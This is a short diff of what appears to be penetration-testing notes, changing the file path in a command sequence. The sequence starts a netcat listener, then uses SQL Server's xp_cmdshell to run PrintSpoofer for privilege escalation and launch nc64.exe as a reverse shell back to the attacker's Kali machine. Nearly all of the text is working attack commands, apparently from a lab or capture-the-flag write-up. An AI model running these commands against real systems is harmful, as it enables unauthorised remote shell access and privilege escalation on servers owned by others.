@@ -51,5 +51,5 @@ nc -lnvp 1234
 
 # Execute the PrintSpoofer
 xp_cmdshell "powershell -c cd C:\Tools; .\PrintSpoofer64.exe
- -c "C:\Tools\nc64.exe  $IPfromOurKali 1234 -e cmd"
+ -c "C:\Users\Public\Documents\nc64.exe  $IPfromOurKali 1234 -e cmd"
 ```
